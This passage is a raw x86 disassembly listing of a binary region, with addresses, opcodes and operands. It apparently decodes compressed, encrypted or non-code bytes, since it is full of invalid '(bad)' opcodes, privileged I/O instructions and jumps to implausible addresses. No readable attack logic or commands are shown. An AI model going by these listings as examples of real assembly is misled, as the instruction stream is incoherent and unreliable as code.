  415aae:	les    ebp,FWORD PTR [esi+0x25]
  415ab1:	pop    eax
  415ab2:	add    eax,0xd60a761
  415ab7:	and    BYTE PTR [edx],dh
  415ab9:	push   cs
  415aba:	loop   0x415a83
  415abc:	addr16 aam 0xba
  415abf:	out    dx,eax
  415ac0:	call   0xe680:0xa1e0130a
  415ac7:	stos   DWORD PTR es:[edi],eax
  415ac8:	mov    al,0xa8
  415aca:	mov    edi,0xa5abc037
  415acf:	sbb    DWORD PTR [eax+0x3bb907cc],ebp
  415ad5:	adc    BYTE PTR ds:0xe8be45a5,dl
  415adb:	test   DWORD PTR [ecx-0x4a85bb53],esi
  415ae1:	lds    ebx,FWORD PTR [ecx+eax*8-0xe]
  415ae5:	call   0x6d9571c1
  415aea:	imul   eax,esp,0xc71aafaa
  415af0:	jp     0x415acb
  415af2:	xor    cl,BYTE PTR [esi-0x344fec0b]
  415af8:	pop    ds
  415af9:	dec    ecx
  415afa:	ja     0x415b1d
  415afc:	ins    BYTE PTR es:[edi],dx
  415afd:	pop    ss
  415afe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415aff:	mov    ds:0x14c17205,al
  415b04:	stos   DWORD PTR es:[edi],eax
  415b05:	jo     0x415b5b
  415b07:	pop    edx
  415b08:	lock jl 0x415a9d
  415b0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b0c:	cmp    al,0x70
  415b0e:	xor    eax,0x6733881b
  415b13:	sub    al,0x63
  415b15:	stos   BYTE PTR es:[edi],al
  415b16:	sbb    eax,0x4def91de
  415b1b:	in     al,dx
  415b1c:	xor    eax,0x87df3b4d
  415b21:	retf   
  415b22:	push   es
  415b23:	shr    BYTE PTR [edi],cl
  415b25:	test   esi,ebx
  415b27:	push   ecx
  415b28:	mov    bh,0x26
  415b2a:	mov    bl,0xa
  415b2c:	add    esi,ecx
  415b2e:	mov    dl,0x78
  415b30:	test   BYTE PTR [esi-0x11],0xa0
  415b34:	leave  
  415b35:	(bad)  
  415b36:	jmp    0x9863:0x1961b96f
  415b3d:	(bad)  
  415b3f:	pusha  
  415b40:	loope  0x415bbc
  415b42:	mov    al,0xa4
  415b44:	ds push ds
  415b46:	adc    DWORD PTR [esi+0x48640f95],edi
  415b4c:	imul   esp,ebp,0x3b
  415b4f:	mov    bh,0xb3
  415b51:	push   edi
  415b52:	call   0xbc33:0x6ff2bb56
  415b59:	cli    
  415b5a:	jne    0x415aff
  415b5c:	xlat   BYTE PTR ds:[ebx]
  415b5d:	xchg   esi,eax
  415b5e:	dec    ecx
  415b5f:	adc    BYTE PTR [edi-0xe],ah
  415b62:	mul    BYTE PTR [edi]
  415b64:	inc    edx
  415b65:	stc    
  415b66:	jmp    0x415b54
  415b68:	xor    DWORD PTR [ebp+0x63],ebx
  415b6b:	push   ebx
  415b6c:	xchg   ebx,eax
  415b6d:	cli    
  415b6e:	pop    ecx
  415b6f:	xor    BYTE PTR [ebx+0x39832ca8],0xba
  415b76:	jg     0x415b0f
  415b78:	test   eax,0x29f98dc3
  415b7d:	xchg   ebp,eax
  415b7e:	sbb    al,0x76
  415b80:	retf   
  415b81:	test   eax,0xfbbfa1dc
  415b86:	pushf  
  415b87:	in     eax,0xd3
  415b89:	xchg   ecx,eax
  415b8a:	mov    eax,ds:0x735cd2f2
  415b8f:	ins    DWORD PTR es:[edi],dx
  415b90:	das    
  415b91:	fnstenv [ebp-0x11]
  415b94:	stos   BYTE PTR es:[edi],al
  415b95:	in     eax,dx
  415b96:	pop    ebx
  415b97:	dec    ebp
  415b98:	shr    edx,cl
  415b9a:	loope  0x415bec
  415b9c:	loop   0x415b89
  415b9e:	jp     0x415bd7
  415ba0:	hlt    
  415ba1:	xchg   edi,eax
  415ba2:	out    0xf7,al
  415ba4:	idiv   BYTE PTR [ecx+0x58]
  415ba7:	aaa    
  415ba8:	repz mov ah,0x1b
  415bab:	mov    dl,0xbd
  415bad:	xlat   BYTE PTR ds:[ebx]
  415bae:	xor    esp,DWORD PTR [edi]
  415bb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bb1:	ret    0xa20b
  415bb4:	pop    esi
  415bb5:	xchg   ebp,eax
  415bb6:	push   es
  415bb7:	mov    bh,ch
  415bb9:	shl    DWORD PTR [edi],0x2b
  415bbc:	dec    edx
  415bbd:	(bad)  
  415bbe:	fimul  DWORD PTR [esi]
  415bc0:	jnp    0x415b94
  415bc2:	or     BYTE PTR [edi*2-0x2f5ea0af],dh
  415bc9:	cmp    BYTE PTR [edi+ebp*4-0x43eb8124],bl
  415bd0:	sub    BYTE PTR [ebx],ah
  415bd2:	sti    
  415bd3:	pop    es
  415bd4:	mov    ebx,0x7e6c8d57
  415bd9:	sub    BYTE PTR gs:[di-0x1a],al
  415bde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415be0:	adc    dl,0x38
  415be3:	test   eax,0x6356a4ef
  415be8:	adc    DWORD PTR [edi+0x25],ecx
  415beb:	jle    0x415b78
  415bed:	inc    ebx
  415bee:	shr    DWORD PTR ds:0x701f9f99,0x98
  415bf5:	pop    es
  415bf6:	fsubr  QWORD PTR [edi-0x52]
  415bf9:	ins    DWORD PTR es:[edi],dx
  415bfa:	(bad)  
  415bfb:	mov    esp,0x83b4b594
  415c00:	lock les esi,FWORD PTR [ecx-0x2a154e04]
  415c07:	xchg   esi,eax
  415c08:	inc    al
  415c0a:	dec    esp
  415c0b:	nop
  415c0c:	or     DWORD PTR [edi],edx
  415c0e:	cld    
  415c0f:	add    BYTE PTR [ebx+0x49cfadf6],dl
  415c15:	out    dx,al
  415c16:	push   0x2b61cd95
  415c1b:	pop    ds
  415c1c:	push   cs
  415c1d:	dec    ebx
  415c1e:	mov    al,BYTE PTR ds:0x7b0c7ac3
  415c24:	pusha  
  415c25:	push   ss
  415c26:	add    ah,al
  415c28:	or     al,0xfe
  415c2a:	sub    al,0x9f
  415c2c:	cmp    ah,BYTE PTR es:[eax-0x38]
  415c30:	pop    ebx
  415c31:	mov    BYTE PTR [ebx+0x77148986],al
  415c37:	xlat   BYTE PTR ds:[ebx]
  415c38:	add    eax,0xb7ecf974
  415c3d:	pop    eax
  415c3e:	jle    0x415bd0
  415c40:	push   ebp
  415c41:	push   ds
  415c42:	(bad)  
  415c43:	out    dx,eax
  415c44:	call   0x77540958
  415c49:	adc    DWORD PTR [eax],ecx
  415c4b:	test   DWORD PTR [edi-0x15a4a59],esi
  415c51:	aad    0xb7
  415c53:	test   DWORD PTR [edi],ebp
  415c55:	aas    
  415c56:	inc    ecx
  415c57:	stos   BYTE PTR es:[edi],al
  415c58:	mov    bl,0xb9
  415c5a:	push   ecx
  415c5b:	mov    edi,0xf887f0cf
  415c60:	and    dl,BYTE PTR [esi]
  415c62:	shl    DWORD PTR [ebp+0xf9f4fe2],0xde
  415c69:	call   0xbd079ab8
  415c6e:	mov    dl,0x9b
  415c70:	jecxz  0x415cce
  415c72:	loope  0x415cde
  415c74:	ficom  WORD PTR ds:0xf5143e75
  415c7a:	xor    edx,0xffffff93
  415c7d:	test   DWORD PTR [edi],eax
  415c7f:	mov    ebx,0x92a1dc6a
  415c84:	mov    al,0xf2
  415c86:	loop   0x415c9a
  415c88:	ss scas al,BYTE PTR es:[edi]
  415c8a:	fs stc 
  415c8c:	cmp    ah,al
  415c8e:	push   ebp
  415c8f:	mov    eax,0x5d238843
  415c94:	mov    cl,0xe9
  415c96:	data16 mov dh,0x2e
  415c99:	out    0x27,al
  415c9b:	cdq    
  415c9c:	sbb    al,0x83
  415c9e:	repz cmp al,BYTE PTR [edx+0x3f]
  415ca2:	mov    bl,0x9
  415ca4:	xchg   BYTE PTR [esi+0x72],bh
  415ca7:	and    DWORD PTR [ebx+0x443e3eb7],edi
  415cad:	(bad)  [esi+ebx*2-0x74]
  415cb1:	jae    0x415cf0
  415cb3:	jno    0x415cd8
  415cb5:	add    eax,ebx
  415cb7:	mov    WORD PTR [ebx],?
  415cb9:	pop    esp
  415cba:	stc    
  415cbb:	loop   0x415d34
  415cbd:	fucom  st(4)
  415cbf:	and    eax,0x34e315
  415cc4:	ja     0x415c80
  415cc6:	inc    eax
  415cc7:	pop    edi
  415cc8:	jg     0x415ccd
  415cca:	repnz jmp 0x5d84:0xc5ee66b0
  415cd2:	inc    ebp
  415cd3:	test   esi,0x37fb1db7
  415cd9:	mov    esi,DWORD PTR [edi+0x14]
  415cdc:	push   eax
  415cdd:	test   al,0xb9
  415cdf:	rcl    BYTE PTR [ecx-0x3be104ed],1
  415ce5:	pop    es
  415ce6:	loopne 0x415d1d
  415ce8:	mov    ds:0x8d2347e7,eax
  415ced:	daa    
  415cee:	jne    0x415cc8
  415cf0:	pop    ebp
  415cf1:	pop    ds
  415cf2:	dec    esp
  415cf3:	cmp    al,0x20
  415cf5:	xlat   BYTE PTR ds:[ebx]
  415cf6:	fst    DWORD PTR [edx]
  415cf8:	pop    edi
  415cf9:	mov    esi,0x851e1285
  415cfe:	outs   dx,BYTE PTR ds:[esi]
  415cff:	fld    DWORD PTR [ecx-0x5bc26645]
  415d05:	stos   BYTE PTR es:[edi],al
  415d06:	mov    BYTE PTR [ebx],al
  415d08:	jl     0x415d0f
  415d0a:	adc    DWORD PTR [esi+0x3db5ff56],edi
  415d10:	in     eax,0xf2
  415d12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d13:	out    0x92,al
  415d15:	mov    edi,0xe9fe5058
  415d1a:	out    dx,eax
  415d1b:	(bad)  
  415d1c:	push   esi
  415d1d:	ja     0x415caa
  415d1f:	adc    eax,0x4815a898
  415d24:	(bad)  
  415d25:	or     dl,bh
  415d27:	push   eax
  415d28:	mov    dl,bh
  415d2a:	pop    esi
  415d2b:	inc    edi
  415d2c:	test   BYTE PTR [ecx-0x79],cl
  415d2f:	cmp    al,0x2c
  415d31:	test   al,0xfa
  415d33:	sbb    bl,BYTE PTR [edi]
  415d35:	mov    ch,0x6e
  415d37:	pop    edx
  415d38:	add    BYTE PTR [ebx+0x5a],dl
  415d3b:	cmp    BYTE PTR [ecx+0x34c80a03],cl
  415d41:	movq   mm5,mm1
  415d44:	xchg   esi,eax
  415d45:	mov    bl,0x4f
  415d47:	in     al,0xc1
  415d49:	outs   dx,DWORD PTR ds:[esi]
  415d4a:	sahf   
  415d4b:	mov    al,ds:0x9baa89f0
  415d50:	mov    ch,0xf9
  415d52:	xchg   esp,eax
  415d53:	imul   edx,esp,0xaa51257a
  415d59:	push   esi
  415d5a:	ins    DWORD PTR es:[edi],dx
  415d5b:	pop    esp
  415d5c:	adc    bl,bh
  415d5e:	rcr    BYTE PTR [edx+0x5b],1
  415d61:	adc    BYTE PTR [edx+edx*2-0x41],cl
  415d65:	ret    0x4424
  415d68:	mov    dl,0x13
  415d6a:	push   esi
  415d6b:	sub    al,0x51
  415d6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d6f:	test   al,0x90
  415d71:	stos   BYTE PTR es:[edi],al
  415d72:	jno    0x415d97
  415d74:	int    0x4d
  415d76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d77:	jg     0x415dd0
  415d79:	cmp    DWORD PTR [edi+0x35],ecx
  415d7c:	leave  
  415d7d:	add    DWORD PTR [ebx-0x4087edc6],edi
  415d83:	(bad)
  415d87:	mov    ah,0x9c
  415d8a:	pop    ebx
  415d8b:	pop    esi
  415d8c:	cmp    cl,bl
  415d8e:	inc    ecx
  415d8f:	(bad)
  415d92:	and    BYTE PTR ds:0x652db80c,bl
  415d98:	pop    fs
  415d9a:	nop
  415d9b:	and    ebx,edx
  415d9d:	mov    ch,0x69
  415d9f:	mov    dl,0xe5
  415da1:	jbe    0x415d39
  415da3:	fcmovnu st,st(1)
  415da5:	dec    esp
  415da6:	jge    0x415e19
  415da8:	xor    al,0x52
  415daa:	ja     0x415d9c
  415dac:	push   edx
  415dad:	fistp  QWORD PTR [ebx-0x506b2f84]
  415db3:	pushf  
  415db4:	cmp    ch,BYTE PTR [eax]
  415db6:	stc    
  415db7:	rol    BYTE PTR [eax+ecx*2+0x68a7723e],cl
  415dbe:	out    dx,eax
  415dbf:	xchg   esp,eax
  415dc0:	mov    ss,WORD PTR [ecx-0x65]
  415dc3:	sbb    BYTE PTR [edx+0x41],cl
  415dc6:	and    BYTE PTR [ebx-0x78c26d91],0x7c
  415dcd:	add    BYTE PTR [esi+0x32bc7053],bl
  415dd3:	int    0xd1
  415dd5:	jge    0x415e55
  415dd7:	aas    
  415dd8:	xchg   esp,eax
  415dd9:	adc    eax,0xdb2cf073
  415dde:	push   esi
  415ddf:	imul   ecx,DWORD PTR [edx-0x66],0xffffffa0
  415de3:	adc    edx,edx
  415de5:	add    esp,DWORD PTR [edx+0x61550ad1]
  415deb:	inc    ebp
  415dec:	in     eax,0xe1
  415dee:	sub    eax,0x753733a3
  415df3:	jae    0x415db9
  415df5:	mov    ah,0x4d
  415df7:	jb     0x415df0
  415df9:	cld    
  415dfa:	fcomip st,st(5)
  415dfc:	out    0xe9,al
  415dfe:	and    DWORD PTR [ecx-0x2d],ebp
  415e01:	and    DWORD PTR [esi-0x60],eax
  415e04:	jns    0x415d98
  415e06:	sti    
  415e07:	xchg   ecx,eax
  415e08:	fwait
  415e09:	ret    0xdcc
  415e0c:	or     bh,ch
  415e0e:	jbe    0x415e6f
  415e10:	sbb    BYTE PTR [ebx+ebp*8],dh
  415e13:	pextrw edx,(bad),0xc5
  415e15:	push   ebp
  415e16:	inc    esi
  415e17:	nop
  415e18:	ror    dh,0xaf
  415e1b:	xor    BYTE PTR [ebx-0x2],dh
  415e1e:	out    0x6b,al
  415e20:	rol    bl,1
  415e22:	jmp    0xdc2dc42e
  415e27:	test   eax,0xde219842
  415e2c:	sub    eax,0xd7b4fdbc
  415e31:	(bad)  
  415e32:	dec    ebp
  415e33:	inc    ebx
  415e34:	jae    0x415e25
  415e36:	xchg   BYTE PTR [ebp-0x8],dl
  415e39:	mov    esp,0xb7e26cd5
  415e3e:	pop    edi
  415e3f:	jno    0x415dee
  415e41:	fdivp  st(2),st
  415e43:	cdq    
  415e44:	xor    eax,0x96671050
  415e49:	sar    BYTE PTR [edx+0x7f5f2b2b],cl
  415e4f:	out    dx,al
  415e50:	push   ecx
  415e51:	inc    edx
  415e52:	pop    es
  415e53:	fist   WORD PTR [esi+edi*4]
  415e56:	pushf  
  415e57:	add    eax,0xbba83f92
  415e5c:	fwait
  415e5d:	sbb    al,0x63
  415e5f:	fild   DWORD PTR [edi-0x5adb18ac]
  415e65:	push   esi
  415e66:	(bad)  
  415e67:	sbb    bh,ah
  415e69:	sbb    BYTE PTR [ebp-0x2bf176f6],bl
  415e6f:	sub    ah,ah
  415e71:	xlat   BYTE PTR ds:[ebx]
  415e72:	scas   eax,DWORD PTR es:[edi]
  415e73:	mov    BYTE PTR [esi-0x125fe86a],dl
  415e79:	(bad)  
  415e7a:	push   ds
  415e7b:	nop
  415e7c:	lds    edi,FWORD PTR [edx]
  415e7e:	fisub  DWORD PTR [eax-0xc]
  415e81:	push   cs
  415e82:	inc    esp
  415e83:	sbb    BYTE PTR ds:0xeeadb2d2,bh
  415e89:	add    DWORD PTR [edx+0x19dd7b19],0x2a
  415e90:	inc    edi
  415e91:	adc    eax,0x2e71d5a9
  415e96:	or     BYTE PTR [esi-0x66],0x75
  415e9a:	imul   esp,DWORD PTR [ecx-0x2a],0x61001b3b
  415ea1:	sbb    DWORD PTR [edi+0x1b11c3e9],0xffffffa5
  415ea8:	and    al,0x6b
  415eaa:	sti    
  415eab:	pushf  
  415eac:	inc    esp
  415ead:	xor    BYTE PTR [edx+0x584f8b0c],0x28
  415eb4:	leave  
  415eb5:	in     eax,0x51
  415eb7:	mov    dh,0xac
  415eb9:	sub    al,0xa4
  415ebb:	fwait
  415ebc:	rol    BYTE PTR [edx],1
  415ebe:	jmp    0x2d41:0xbddbb032
  415ec5:	inc    ecx
  415ec6:	mov    edi,0x6bdbfe1e
  415ecb:	xor    ecx,DWORD PTR [ebx-0x1a]
  415ece:	out    0x90,eax
  415ed0:	dec    eax
  415ed1:	mov    ss,edi
  415ed3:	sub    DWORD PTR [esi+ebp*2+0x78],edi
  415ed7:	jl     0x415f15
  415ed9:	scas   al,BYTE PTR es:[edi]
  415eda:	jnp    0x415eba
  415edc:	xor    dh,BYTE PTR [edx-0x42]
  415edf:	cmp    BYTE PTR [ebx+0x1d9f5531],ch
  415ee5:	mov    eax,ds:0xec894f73
  415eea:	pop    ebp
  415eeb:	jbe    0x415e8c
  415eed:	xchg   ecx,eax
  415eee:	fidivr DWORD PTR [ebp+0x21]
  415ef1:	inc    ebp
  415ef2:	(bad)  
  415ef4:	adc    DWORD PTR [edi],0xcc05fbe2
  415efa:	and    DWORD PTR [eax-0x2e33d478],0xffffffef
  415f01:	mov    bl,0x33
  415f03:	(bad)
  415f08:	pop    ss
  415f09:	add    esi,DWORD PTR [ecx]
  415f0b:	loop   0x415f25
  415f0d:	shl    BYTE PTR [edx-0x5d2591b7],cl
  415f13:	adc    edi,DWORD PTR [ebp+0x2cb9bab7]
  415f19:	mov    ebp,0x8293c134
  415f1e:	stos   BYTE PTR es:[edi],al
  415f1f:	lahf   
  415f20:	arpl   dx,di
  415f22:	cmp    eax,0xbd9bba1e
  415f27:	ss cmc 
  415f29:	lods   al,BYTE PTR ds:[esi]
  415f2a:	lock inc esi
  415f2c:	ins    BYTE PTR es:[edi],dx
  415f2d:	mov    ch,0x8c
  415f2f:	dec    edi
  415f30:	xor    eax,0x5aa6ee03
  415f35:	mov    dl,0x7c
  415f37:	mov    WORD PTR [ebx-0x6e],fs
  415f3a:	mov    bl,BYTE PTR [ecx+0x6b]
  415f3d:	dec    edx
  415f3e:	into   
  415f3f:	jmp    0x76cb2dfd
  415f44:	pop    ebx
  415f45:	cmc    
  415f46:	outs   dx,DWORD PTR ds:[esi]
  415f47:	fnstsw WORD PTR [edi-0x2648dc93]
  415f4d:	push   ss
  415f4e:	aad    0x17
  415f50:	ss adc eax,edi
  415f53:	outs   dx,BYTE PTR ds:[esi]
  415f54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f55:	xor    DWORD PTR [edx+0x68c7cbc8],edx
  415f5b:	dec    bl
  415f5d:	push   ds
  415f5e:	stos   DWORD PTR es:[edi],eax
  415f5f:	fadd   QWORD PTR [ebx+0x5f6605fd]
  415f65:	dec    esi
  415f66:	aad    0x4e
  415f68:	xchg   esp,eax
  415f69:	fdivr  DWORD PTR [ebx+0x64]
  415f6c:	gs inc ebp
  415f6e:	push   ds
  415f6f:	pop    edi
  415f70:	je     0x415f25
  415f72:	push   ebx
  415f73:	sub    DWORD PTR [ebp+0x7b74b0f],eax
  415f79:	pop    di
  415f7b:	mov    ch,0x6a
  415f7d:	lods   eax,DWORD PTR ds:[esi]
  415f7e:	pop    edx
  415f7f:	lods   eax,DWORD PTR ds:[esi]
  415f80:	mov    cl,0x6f
  415f82:	stos   BYTE PTR es:[edi],al
  415f83:	ins    BYTE PTR es:[edi],dx
  415f84:	add    BYTE PTR [ecx+0x7d1787c5],dl
  415f8a:	data16 or BYTE PTR fs:[ecx-0x70934cf9],0x13
  415f93:	ins    DWORD PTR es:[edi],dx
  415f94:	es (bad) 
  415f96:	scas   eax,DWORD PTR es:[edi]
  415f97:	cmp    edi,ebx
  415f99:	sub    edx,DWORD PTR [ecx]
  415f9b:	push   edx
  415f9c:	cmp    BYTE PTR [ecx+edi*8],0x4a
  415fa0:	mov    dl,0x63
  415fa2:	xor    BYTE PTR [ebx+eiz*8],bh
  415fa5:	pop    ebx
  415fa6:	mov    al,ds:0x49091b99
  415fab:	push   eax
  415fac:	jbe    0x41600c
  415fae:	or     eax,DWORD PTR [edi+0x7]
  415fb1:	rcr    BYTE PTR [edi+0x1862c29d],0xc1
  415fb8:	(bad)  
  415fb9:	pusha  
  415fba:	lods   eax,DWORD PTR ds:[esi]
  415fbb:	xor    dl,bl
  415fbd:	(bad)  
  415fbe:	out    dx,eax
  415fbf:	xchg   edi,eax
  415fc0:	lods   eax,DWORD PTR ds:[esi]
  415fc1:	mov    esi,0x1f79ad7d
  415fc6:	in     al,0x1f
  415fc8:	xchg   esp,eax
  415fc9:	push   esi
  415fca:	mov    eax,ds:0xc14f2306
  415fcf:	or     al,0x8b
  415fd1:	push   esi
  415fd2:	jp     0x415faa
  415fd4:	pop    ebp
  415fd5:	ss into 
  415fd7:	add    BYTE PTR [ecx-0x3276d9fe],dl
  415fdd:	idiv   BYTE PTR [edx+0xc]
  415fe0:	pop    es
  415fe1:	inc    ebp
  415fe2:	jns    0x415f8b
  415fe4:	mov    eax,ds:0xca57e7a
  415fe9:	bound  esp,QWORD PTR [eax]
  415feb:	pop    eax
  415fec:	push   edx
  415fed:	mov    edx,0xcd10013
  415ff2:	mov    al,ds:0x9c456ebd
  415ff7:	add    al,0xa
  415ff9:	ret    
  415ffa:	mov    esi,DWORD PTR [edi+0x788bd7df]
  416000:	daa    
  416001:	mov    ch,0x42
  416003:	ds in  al,0xdf
  416006:	ja     0x416032
  416008:	xchg   ebp,eax
  416009:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41600a:	inc    esp
  41600b:	ins    BYTE PTR es:[edi],dx
  41600c:	popf   
  41600d:	subps  xmm3,XMMWORD PTR [eax-0x19790eb8]
  416014:	leave  
  416015:	icebp  
  416016:	mov    eax,ds:0x5a977f3a
  41601b:	loopne 0x416078
  41601d:	(bad)  
  41601e:	or     al,0xd9
  416020:	ja     0x416015
  416022:	inc    ebp
  416023:	jg     0x415fca
  416025:	(bad)  
  416027:	and    eax,0xefb3fd28
  41602c:	pop    esp
  41602d:	sbb    al,0xbd
  41602f:	inc    ebp
  416030:	dec    edi
  416031:	daa    
  416032:	mov    bh,0xfd
  416034:	cmc    
  416035:	sbb    bl,BYTE PTR [ebx+0x45]
  416038:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416039:	mov    esp,0x4a3aac86
  41603e:	bound  ebp,QWORD PTR [ebx]
  416040:	out    0x47,al
  416042:	and    bh,BYTE PTR [eax-0xfad1707]
  416048:	push   eax
  416049:	pop    es
  41604a:	lds    bx,DWORD PTR [eax+edi*8]
  41604e:	pop    ds
  41604f:	inc    esi
  416050:	pusha  
  416051:	and    DWORD PTR [ebx+esi*4],0xd6a83d51
  416058:	sbb    DWORD PTR [ecx-0x56404741],esi
  41605e:	out    dx,eax
  41605f:	mov    esi,0x31d183f0
  416064:	sub    DWORD PTR [edx],eax
  416066:	icebp  
  416067:	push   eax
  416068:	dec    edi
  416069:	push   esi
  41606a:	inc    esp
  41606b:	inc    edx
  41606c:	mov    al,0xcc
  41606e:	int3   
  41606f:	pusha  
  416070:	sub    al,BYTE PTR [eax+0x313849e]
  416076:	xor    eax,0x96312d9
  41607b:	adc    eax,DWORD PTR [edi+eiz*8+0x71310eed]
  416082:	retf   0xa38d
  416085:	dec    eax
  416086:	cld    
  416087:	cmc    
  416088:	call   0x5537b295
  41608d:	sbb    eax,0x9a8e383f
  416092:	cmp    al,dl
  416094:	ds mov eax,0x2989fb3a
  41609a:	xchg   ecx,eax
  41609b:	jle    0x416118
  41609d:	addr16 jne 0x4160d7
  4160a0:	leave  
  4160a1:	or     ecx,ebx
  4160a3:	aaa    
  4160a4:	nop
  4160a5:	data16 loope 0x416118
  4160a8:	push   es
  4160a9:	fidiv  WORD PTR [esi+eiz*8]
  4160ac:	je     0x41605c
  4160ae:	mov    esp,0xffcb2fd0
  4160b3:	(bad)  
  4160b4:	and    BYTE PTR [ecx+0x389bbc36],bl
  4160ba:	out    0x36,eax
  4160bc:	in     al,0xc9
  4160be:	push   0xffffff95
  4160c0:	sbb    bh,ah
  4160c2:	inc    edi
  4160c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160c4:	pop    esi
  4160c5:	jnp    0x41604b
  4160c7:	xchg   esp,eax
  4160c8:	inc    edi
  4160c9:	cwde   
  4160ca:	push   ebx
  4160cb:	mov    ah,BYTE PTR [esi+0x45]
  4160ce:	adc    eax,0xefc07188
  4160d3:	push   ebx
  4160d4:	xchg   ebp,eax
  4160d5:	push   ds
  4160d6:	adc    eax,0xbef9f1af
  4160db:	xor    ah,0x87
  4160de:	cs mov ebp,0xe8da991f
  4160e4:	sar    DWORD PTR [eax+0x40853cc7],0xbd
  4160eb:	cmp    BYTE PTR [ecx+0x40],dh
  4160ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160ef:	mov    esp,0x6582d0eb
  4160f4:	icebp  
  4160f5:	xchg   BYTE PTR [esi+ebp*1+0x17dbfd87],ch
  4160fc:	and    al,dh
  4160fe:	scas   al,BYTE PTR es:[edi]
  4160ff:	pop    ss
  416100:	sub    BYTE PTR [ebp-0x4b0aa09b],ah
  416106:	inc    esi
  416107:	add    al,bl
  416109:	imul   BYTE PTR [eax-0x1f]
  41610c:	enter  0x128,0x59
  416110:	call   0xcbb5d4ef
  416115:	push   eax
  416116:	mov    al,ds:0x85a7c555
  41611b:	not    DWORD PTR [edx+0x68]
  41611e:	fmul   QWORD PTR [ecx+ebp*2]
  416121:	inc    edx
  416122:	xchg   esi,eax
  416123:	pop    ds
  416124:	mov    DWORD PTR [edx+eiz*4-0xe],edi
  416128:	and    al,0xcc
  41612a:	mov    dh,0xfa
  41612c:	xor    bl,bl
  41612e:	cmp    BYTE PTR [ebp+0xf],bh
  416131:	ror    esp,0x2d
  416134:	or     BYTE PTR [esi+edx*4-0x59c516e5],ah
  41613b:	dec    edi
  41613c:	or     al,0x98
  41613e:	jle    0x416101
  416140:	xchg   esi,eax
  416141:	gs inc esp
  416143:	xor    bl,BYTE PTR [esi+0x16]
  416146:	ret    
  416147:	(bad)  
  416148:	jg     0x416135
  41614a:	int3   
  41614b:	js     0x4160f6
  41614d:	dec    edx
  41614e:	adc    esp,DWORD PTR [eax]
  416150:	hlt    
  416151:	retf   0x1454
  416154:	aad    0x1d
  416156:	xchg   esi,eax
  416157:	je     0x416161
  416159:	push   edi
  41615a:	jl     0x416136
  41615c:	cdq    
  41615d:	jle    0x416104
  41615f:	aad    0x8b
  416161:	dec    eax
  416162:	aam    0x65
  416164:	jne    0x4161e5
  416166:	call   0x4b1f63e8
  41616b:	mov    ecx,0xcd57580b
  416170:	fistp  DWORD PTR [eax+0x59]
  416173:	pushf  
  416174:	repnz inc ebx
  416176:	sti    
  416177:	leave  
  416178:	jbe    0x41617b
  41617a:	rcr    BYTE PTR [ebx+edi*1-0x12],0xc3
  41617f:	into   
  416180:	outs   dx,BYTE PTR ds:[esi]
  416181:	imul   ebx,DWORD PTR [eax+edx*4+0x69],0x6a
  416186:	mov    ah,0xc1
  416188:	mov    ah,0x35
  41618a:	std    
  41618b:	jge    0x416174
  41618d:	jmp    0xf1e6c9b9
  416192:	inc    edi
  416193:	and    ebx,esp
  416195:	sub    edx,DWORD PTR [ebx+0x2346b2b3]
  41619b:	jae    0x4161ea
  41619d:	mov    esp,0x374c7297
  4161a2:	scas   al,BYTE PTR es:[edi]
  4161a3:	dec    ebx
  4161a4:	rol    BYTE PTR [edx-0x3b],1
  4161a7:	jo     0x41614d
  4161a9:	push   edi
  4161aa:	sbb    ah,bl
  4161ac:	int3   
  4161ad:	pushf  
  4161ae:	cmp    DWORD PTR [ebx+0x24d82ed2],eax
  4161b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161b5:	or     al,0xe9
  4161b7:	loopne 0x4161bb
  4161b9:	out    0x61,eax
  4161bb:	scas   al,BYTE PTR es:[edi]
  4161bc:	jle    0x41620c
  4161be:	fild   WORD PTR ds:0xdc6b11c1
  4161c4:	cdq    
  4161c5:	add    al,0x8d
  4161c7:	or     dh,cl
  4161c9:	rol    DWORD PTR [ebx+ebx*1+0x42],cl
  4161cd:	mov    dl,BYTE PTR [ebx-0x7c9e42b1]
  4161d3:	vpxor  xmm7,xmm5,xmm4
  4161d7:	mov    al,ds:0x62770abe
  4161dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161de:	xlat   BYTE PTR ds:[ebx]
  4161df:	rol    DWORD PTR ds:0x488d10b3,1
  4161e5:	mov    al,es:0xccfc533a
  4161eb:	hlt    
  4161ec:	out    0x1d,eax
  4161ee:	ds out 0xf5,al
  4161f1:	sbb    al,0x3
  4161f3:	sbb    eax,0xc5115d33
  4161f8:	fistp  DWORD PTR [ecx+ecx*1+0x7f93f34b]
  4161ff:	ja     0xa39534b
  416205:	scas   al,BYTE PTR es:[edi]
  416206:	lods   eax,DWORD PTR ds:[esi]
  416207:	aas    
  416208:	inc    ecx
  416209:	stos   BYTE PTR es:[edi],al
  41620a:	add    BYTE PTR ds:0x66fcb7a3,0x4f
  416211:	or     eax,0x2adc233f
  416216:	mov    BYTE PTR [ecx+0x284f64f7],ch
  41621c:	shl    DWORD PTR [esi+eiz*1+0x59261bd0],1
  416223:	add    BYTE PTR [ebp+0x4dad5928],cl
  416229:	push   cs
  41622a:	mov    bh,0x58
  41622c:	sbb    DWORD PTR [ecx],eax
  41622e:	jl     0x41628d
  416230:	(bad)  
  416231:	adc    esp,eax
  416233:	arpl   WORD PTR [esi],dx
  416235:	repz cmovle edi,DWORD PTR [ebx]
  416239:	mov    dl,0x79
  41623b:	or     cl,cl
  41623d:	jp     0x416238
  41623f:	and    ecx,DWORD PTR [esp+edi*8-0x5ed14f26]
  416246:	adc    al,0xb3
  416248:	jge    0x416204
  41624a:	stc    
  41624b:	enter  0x933,0x4
  41624f:	fmul   QWORD PTR [edi+0x4b]
  416252:	cs and esp,ebp
